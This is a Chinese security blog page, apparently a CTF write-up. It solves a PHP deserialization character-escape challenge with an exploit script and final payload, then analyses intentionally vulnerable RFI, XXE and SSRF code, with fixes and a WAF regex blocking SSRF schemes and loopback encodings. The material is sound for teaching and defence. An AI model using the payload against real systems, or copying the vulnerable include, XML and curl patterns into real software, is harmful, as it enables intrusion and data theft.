<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$uname</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$uname</span>,<span class="hljs-variable">$password</span></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;uname=<span class="hljs-variable">$uname</span>;
        <span class="hljs-keyword">$this</span>-&gt;password=<span class="hljs-variable">$password</span>;
    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-string">&#x27;easy&#x27;</span>)
        &#123;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;flag&#123;xxxxxx&#125;&#x27;)&lt;/script&gt;&quot;</span>;
        &#125;
        <span class="hljs-keyword">else</span>
        &#123;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;继续加油&#x27;)&lt;/script&gt;&quot;</span>;
        &#125;
    &#125;
&#125;
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;
    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;challenge&#x27;</span>,<span class="hljs-string">&#x27;easychallenge&#x27;</span>,<span class="hljs-variable">$string</span>);
&#125;
<span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>];
<span class="hljs-variable">$password</span>=<span class="hljs-number">1</span>;
<span class="hljs-variable">$ser</span>=filter(serialize(<span class="hljs-keyword">new</span> a(<span class="hljs-variable">$uname</span>,<span class="hljs-variable">$password</span>)));
<span class="hljs-variable">$test</span>=unserialize(<span class="hljs-variable">$ser</span>);
<span class="hljs-meta">?&gt;</span></code></pre>



<p>开始解题</p>
<p><strong>考察点是反序列化字符逃逸</strong></p>
<p>先从简单的PHP反序列化字符逃逸了解什么是反序化逃逸。</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;
    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;bb&#x27;</span>, <span class="hljs-string">&#x27;ccc&#x27;</span>, <span class="hljs-variable">$str</span>);
&#125;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;aaaa&#x27;</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;
&#125;
<span class="hljs-variable">$AA</span>=<span class="hljs-keyword">new</span> A();
<span class="hljs-variable">$res</span>=filter(serialize(<span class="hljs-variable">$AA</span>));

<span class="hljs-variable">$c</span>=unserialize(<span class="hljs-variable">$res</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>-&gt;pass;

<span class="hljs-meta">?&gt;</span></code></pre>

<p>利用反序列化逃逸修改pass的值。</p>
<p>正常的序列化结果</p>
<pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;&#125;</code></pre>

<p><code>s:4:&quot;aaaa&quot;</code>s后面的数字表示变量的长度，php执行的时候会根据其长度读取数据，如果不符合规则则会反序列化失败。</p>
<p>例如</p>
<pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;&#125;</code></pre>

<p>将4改为5，那么则认为name的值为 <code>aaaa&quot;</code>,此时因为前面的”无法闭合而导致反序列化失败。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/Ctefk8iKXP34Gmn.png" alt="error.png"></p>
<p>而上面的程序中存在一个替换函数，只要name中存在bb则将其替换为ccc，导致name字段的长度会增加1，我们将逃逸的字符串的长度填充成我们要反序列化的代码的话那就可以控制反序列化的结果以及类里面的变量值了。那么就可以利用这个函数来构造出想要的序列化字符串。</p>
<p>例如想将pass变量的序列化字符串如下</p>
<pre><code class="hljs css">&quot;;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;hacker&quot;</span>;&#125;</code></pre>

<p>其中 前面的 “;是为了闭合的变量的”，保证语法正确，}的作用是序列化字符串结束的标志</p>
<p>上面的字符串长度为27，所以就需要27个bb来产生27个字符长度的逃逸</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;
    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;bb&#x27;</span>, <span class="hljs-string">&#x27;ccc&#x27;</span>, <span class="hljs-variable">$str</span>);
&#125;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;
&#125;
<span class="hljs-variable">$AA</span>=<span class="hljs-keyword">new</span> A();
var_dump(serialize(<span class="hljs-variable">$AA</span>));
<span class="hljs-variable">$res</span>=filter(serialize(<span class="hljs-variable">$AA</span>));
var_dump(<span class="hljs-variable">$res</span>);
<span class="hljs-variable">$c</span>=unserialize(<span class="hljs-variable">$res</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>-&gt;pass;
<span class="hljs-comment">//echo unserialize($AA);</span>
<span class="hljs-comment">//&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;</span>
<span class="hljs-meta">?&gt;</span>
<span class="hljs-comment">//结果如下   ||为对齐</span>
<span class="hljs-comment">/*</span>
<span class="hljs-comment">string(136) &quot;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;&quot;||</span>
<span class="hljs-comment">string(163) &quot;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:81:&quot;ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&quot;||;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;&quot;</span>
<span class="hljs-comment">hacker</span>
<span class="hljs-comment">*/</span></code></pre>

<p><img src="https://i.loli.net/2020/11/18/qgC18vQGcElFy2e.png" alt="success.png"></p>
<p>这里pass的值就被该称了hacker</p>
<p>总结：<strong>逃逸或者说被“顶”出来的payload就会被当做当前类的属性被执行。</strong></p>
<p>而针对这道题，代码的意思大致为，POST提交一个uanme，password默认为1，之后生成一个序列化字符串并将字符串中的challenge换成easychallenge，字符长度增加4，当密码为easy时，得到flag。这题看上去与上面的例子差不多，但是构造的时候发现并不是</p>
<p>需要构造的属性</p>
<pre><code class="hljs vim"><span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;;s:4:&quot;</span>password<span class="hljs-string">&quot;;s:4:&quot;</span>easy<span class="hljs-comment">&quot;;&#125;) =29</span></code></pre>

<p>可以发现上面的字符串长度为29，而每替换一个challenge只能逃逸出4个字符，不能构造出29，因此这里需要再构造出一个属性，使上面的字符串的长度为4的倍数。</p>
<pre><code class="hljs css">&quot;;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;easy&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;&#125;</code></pre>

<p>上面构造出的payload长度为48因此还需要12个challenge。</p>
<p><strong>exp如下</strong></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$uname</span>=<span class="hljs-string">&#x27;challengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;s:4:&quot;aaaa&quot;;s:1:&quot;a&quot;;&#125;&#x27;</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;1&quot;</span>;
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;
    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;challenge&#x27;</span>,<span class="hljs-string">&#x27;easychallenge&#x27;</span>,<span class="hljs-variable">$string</span>);
&#125;
<span class="hljs-variable">$ser</span>=filter(serialize(<span class="hljs-keyword">new</span> a(<span class="hljs-variable">$uname</span>,<span class="hljs-variable">$password</span>)));
<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$ser</span>);
<span class="hljs-meta">?&gt;</span></code></pre>

<p>输出的结果：</p>
<pre><code class="hljs scss">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;uname&quot;</span>;s:<span class="hljs-number">156</span>:<span class="hljs-string">&quot;easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;easy&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;&#125;&quot;;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;&#125;

<span class="hljs-comment">//easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge  长度为156</span></code></pre>

<p><strong>finalpayload</strong>：</p>
<pre><code class="hljs css">challengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;easy&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;&#125;</code></pre>

<p>提交payload，获取flag</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323194642093.png" alt="image-20210323194642093"></p>
<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><h2 id="1-RFI-1"><a href="#1-RFI-1" class="headerlink" title="1.RFI"></a>1.RFI</h2><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>代码位置<code>application\employee\controller\Index.php</code></p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-variable">$file</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];
        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) || <span class="hljs-variable">$file</span> == <span class="hljs-string">&#x27;&#x27;</span>) &#123;
            <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;info.php&#x27;</span>;
        &#125;
	<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;<span class="hljs-subst">$file</span>&quot;</span>;
    <span class="hljs-variable">$info</span> = [];
    <span class="hljs-variable">$info</span> = <span class="hljs-variable">$info_1</span>;

    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch(<span class="hljs-string">&#x27;index&#x27;</span>, [<span class="hljs-string">&#x27;info&#x27;</span> =&gt; <span class="hljs-variable">$info</span>]);
    <span class="hljs-keyword">return</span> view();
    &#125;</code></pre>

<p>这个代码很简单，就是包含了<code>info.php</code>文件按，并获取其中的$info参数，然后发送给前端，然后在前端显示内容。但是也很危险，因为有include函数的存在，所以存在RFI，而且对提交的参数没有任何的检查和过滤，很容易被攻击者利用</p>
<h3 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><ul>
<li><p><strong>方法一</strong></p>
<p>修改php.ini文件，在其中添加</p>
<pre><code class="hljs ini"><span class="hljs-attr">allow_url_open</span> = <span class="hljs-literal">off</span>
<span class="hljs-attr">allow_url_include</span> = <span class="hljs-literal">off</span></code></pre>

<p>构成RFI漏洞的条件十分苛刻，只有php.ini中上面两个配置项都没off才能利用该漏洞。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420142620521.png" alt="image-20210420142620521" style="zoom: 67%;">
</li>
<li><p><strong>方法二</strong></p>
<p>在代码中限制提交上的文件名，因为只需要包含<code>about.php</code>，所以检查提交上<code>$file</code>是否为<code>about.php</code></p>
<pre><code class="hljs php"><span class="hljs-variable">$file</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];
      <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) || <span class="hljs-variable">$file</span> == <span class="hljs-string">&#x27;&#x27;</span>) &#123;
          <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;info.php&#x27;</span>;
      &#125;
      <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;info.php&quot;</span>)&#123;
          <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;文件名错误！&quot;</span>)
      &#125;
      <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;<span class="hljs-subst">$file</span>&quot;</span>;</code></pre>



</li>
</ul>
<h2 id="2-XXE-1"><a href="#2-XXE-1" class="headerlink" title="2.XXE"></a>2.XXE</h2><h3 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3><p>代码位置<code>application\advice\controller\Index.php</code></p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;

        <span class="hljs-variable">$result</span> = <span class="hljs-literal">null</span>;
        <span class="hljs-variable">$code</span> = <span class="hljs-number">0</span>;
        libxml_disable_entity_loader(<span class="hljs-literal">false</span>);
        <span class="hljs-variable">$xmlfile</span> = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);

        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$xmlfile</span> !== <span class="hljs-string">&quot;&quot;</span>)&#123;
            <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> DOMDocument();
            <span class="hljs-comment">// var_dump($dom);</span>
            <span class="hljs-variable">$dom</span>-&gt;loadXML(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);
            <span class="hljs-variable">$creds</span> = simplexml_import_dom(<span class="hljs-variable">$dom</span>);

            <span class="hljs-variable">$username</span> = <span class="hljs-variable">$creds</span>-&gt;username;
            <span class="hljs-variable">$info</span> = <span class="hljs-variable">$creds</span>-&gt;info;

            <span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;yzncms&quot;</span>);
            <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$conn</span>) &#123;
                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connection failed: &quot;</span> . mysqli_connect_error());
            &#125;
            <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO yzn_new (name, info) values(&#x27;<span class="hljs-subst">$username</span>&#x27;,&#x27;<span class="hljs-subst">$info</span>&#x27;)&quot;</span>;
            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-variable">$sql</span>))&#123;
                <span class="hljs-variable">$code</span> = <span class="hljs-number">1</span>;
                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;提交成功！&#x27;)&lt;/script&gt;&quot;</span>;
                <span class="hljs-variable">$result</span> = sprintf(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-variable">$username</span>);
            &#125;<span class="hljs-keyword">else</span>&#123;
                <span class="hljs-variable">$result</span> = sprintf(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$username</span>);
            &#125;
        &#125;</code></pre>



<p>前端代码</p>
<pre><code class="hljs html">var data = &quot;<span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>&quot; + username + &quot;<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">info</span>&gt;</span>&quot; + info + &quot;<span class="hljs-tag">&lt;/<span class="hljs-name">info</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span>&quot;;
            $.ajax(&#123;
                type: &quot;POST&quot;,
                url: &quot;/advice/index&quot;,
                contentType: &quot;application/xml;charset=utf-8&quot;,
                data: data,
                dataType: &quot;xml&quot;,
                anysc: false,
                success: function (result) &#123;
                    var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue;
                    if(code === &quot;0&quot;)&#123;
                        $(&quot;.msg&quot;).text(&#x27;submit&#x27; + &quot;fail!&quot;);
                    &#125;else &#123;
                        $(&quot;.msg&quot;).text(&#x27;submit&#x27; + &quot;success!&quot;);
                    &#125;
                &#125;,
            &#125;);</code></pre>

<p>上面的两端代码，一个是前端的数据传送，一个是后端的数据处理</p>
<p>可以看到前端将用户提交的数据一xml格式以post方式发送给后端，而在后端中使用了<code>$xmlfile = file_get_contents(&#39;php://input&#39;);</code>，可以看到这里不仅使用了file_get_contents，而且使用了php伪协议<code>php://input</code>，这个协议可以读取用户用post方式提交的数据，这就意味着攻击者可以使用抓包的方式修改自己所提交的数据，从而引入外部实体，造成XXE漏洞，而最主要的原因是这段代码，这个函数参数伪true时，就是禁止引入外部实体，而这里选择了false</p>
<pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">libxml_disable_entity_loader</span>(<span class="hljs-variable"><span class="hljs-literal">false</span></span>)</span></code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210330213939369.png" alt="image-20210330213939369" style="zoom:67%;">

<h3 id="漏洞防御-1"><a href="#漏洞防御-1" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><ul>
<li><p><strong>方法一</strong></p>
<p>使用所开发的语言提供的禁用外部实体的方法</p>
<p>php中的是</p>
<p>也就是这个漏洞的防御方法</p>
<pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">libxml_disable_entity_loader</span>(<span class="hljs-variable"><span class="hljs-literal">true</span></span>);</span></code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420141804839.png" alt="image-20210420141804839" style="zoom: 80%;">

<p>java:</p>
</li>
</ul>
<pre><code class="hljs reasonml">  DocumentBuilderFactory dbf =<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DocumentBuilderFactory</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>;
dbf.set<span class="hljs-constructor">ExpandEntityReferences(<span class="hljs-params">false</span>)</span>;</code></pre>

<p>  python:</p>
  <pre><code class="hljs routeros"><span class="hljs-keyword">from</span> lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(<span class="hljs-attribute">resolve_entities</span>=<span class="hljs-literal">False</span>))</code></pre>



<ul>
<li><p><strong>方法二</strong></p>
<p>代码层面的防御，在代码中添加对用户提交数据的检测函数</p>
<p>比如</p>
<pre><code class="hljs erlang-repl">&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC</code></pre>

<p>上面的关键词是XMl实体中不可缺少的关键词，所以过滤后，可以大概率的防止XXE攻击</p>
</li>
</ul>
<h2 id="3-SSRF-1"><a href="#3-SSRF-1" class="headerlink" title="3.SSRF"></a>3.SSRF</h2><h3 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h3><p>代码位置<code>application\info\controller\Index.php</code></p>
<pre><code class="hljs php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-variable">$url</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];
        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$url</span>) || <span class="hljs-variable">$url</span> == <span class="hljs-string">&#x27;&#x27;</span>) &#123;
            <span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;https://sunzy.icu&#x27;</span>;
        &#125;
        <span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;https://sunzy.icu&#x27;</span>;
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$url</span>) &#123;
            <span class="hljs-variable">$ch</span> = curl_init();
            curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);
            curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);
            curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);
            curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="hljs-literal">false</span>);
            curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="hljs-literal">false</span>);
            <span class="hljs-variable">$co</span> = curl_exec(<span class="hljs-variable">$ch</span>);
            curl_close(<span class="hljs-variable">$ch</span>);
            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$co</span>;
        &#125;
<span class="hljs-comment">//        return view();</span>
    &#125;</code></pre>

<p>在上面的代码中，需要接收一个参数<code>url</code>，如果参数为空，则赋值为<code>https://sunzy.icu</code>，否则直接进行curl初始化，然后进行访问，可以看到没有对提交的参数进行任何的检查和过滤，这是很危险的。</p>
<h3 id="漏洞防御-2"><a href="#漏洞防御-2" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><ul>
<li><strong>方法一</strong></li>
</ul>
<p>黑名单 内网过滤，端口限制，协议限制只允许使用http/https</p>
<p>在这个系统中防御该SSRF漏洞其实非常简单，就是禁止提交参数，或者绑定参数代码如下</p>
<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_inner_ip</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-comment">//只允许http和https协议</span>
    <span class="hljs-variable">$match_result</span> = preg_match(<span class="hljs-string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>, <span class="hljs-variable">$url</span>);
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$match_result</span>) &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;url fomat error&#x27;</span>);
    &#125;
    <span class="hljs-keyword">try</span> &#123;
        <span class="hljs-variable">$url_parse</span> = parse_url(<span class="hljs-variable">$url</span>);
    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;url fomat error&#x27;</span>);
    &#125;
    <span class="hljs-variable">$hostname</span> = <span class="hljs-variable">$url_parse</span>[<span class="hljs-string">&#x27;host&#x27;</span>];
    <span class="hljs-variable">$ip</span> = gethostbyname(<span class="hljs-variable">$hostname</span>);
    <span class="hljs-variable">$int_ip</span> = ip2long(<span class="hljs-variable">$ip</span>);
    <span class="hljs-comment">//不允许host为内网ip地址</span>
    <span class="hljs-keyword">return</span> ip2long(<span class="hljs-string">&#x27;127.0.0.0&#x27;</span>) &gt;&gt; <span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span> &gt;&gt; <span class="hljs-number">24</span> || ip2long(<span class="hljs-string">&#x27;10.0.0.0&#x27;</span>) &gt;&gt; <span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span> &gt;&gt; <span class="hljs-number">24</span> || ip2long(<span class="hljs-string">&#x27;172.16.0.0&#x27;</span>) &gt;&gt; <span class="hljs-number">20</span> == <span class="hljs-variable">$int_ip</span> &gt;&gt; <span class="hljs-number">20</span> || ip2long(<span class="hljs-string">&#x27;192.168.0.0&#x27;</span>) &gt;&gt; <span class="hljs-number">16</span> == <span class="hljs-variable">$int_ip</span> &gt;&gt; <span class="hljs-number">16</span>;
&#125;</code></pre>



<ul>
<li><p><strong>方法二</strong></p>
<p>对于一般的SSRF防御，一般从一下几方面入手</p>
<ul>
<li><p>限制协议为HTTP、HTTPS</p>
</li>
<li><p>不用限制302重定向</p>
</li>
<li><p>设置URL白名单或者限制内网IP</p>
</li>
<li><p>限制请求的端口为http常用的端口，比如，80,443,8080,8090</p>
</li>
</ul>
</li>
</ul>
<p>下面是自己编写的WAF</p>
<pre><code class="hljs php"><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;http://baidu.com/test&quot;</span>;
<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/file|ftp|tftp|gopher|dict|localhost|127\.0\.0\.1|3232235521|2130706433|0x|0177\.0\.0\.01|0\.0\.0\.0|xip|@/i&quot;</span>,<span class="hljs-variable">$url</span>))&#123;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;you are a hacker!!!&quot;</span>);
&#125;</code></pre>

<p>解释一下为什么要用上面的正则过滤url</p>
<ul>
<li><p>file|ftp|tftp|gopher|dict</p>
<p>是让改url只能使用http/https协议，这样可以避免大部分的攻击。</p>
</li>
<li><p>localhost|127.0.0.1</p>
<p>是为了防止攻击者探测内网端口，以免泄露一些容易被攻击的应用程序</p>
</li>
<li><p>3232235521|2130706433|0x|0177.0.0.01|0.0.0.0</p>
<p>这几个是为了防止攻击者对127.0.0.1进行八进制，十六进制，十进制的转码，从而绕过之前的检测</p>
</li>
<li><p>xip|@</p>
<p>这两个是防止攻击者使用302跳转攻击</p>
</li>
</ul>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420142252510.png" alt="image-20210420142252510" style="zoom: 33%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420142336577.png" alt="image-20210420142336577" style="zoom: 33%;"></p>
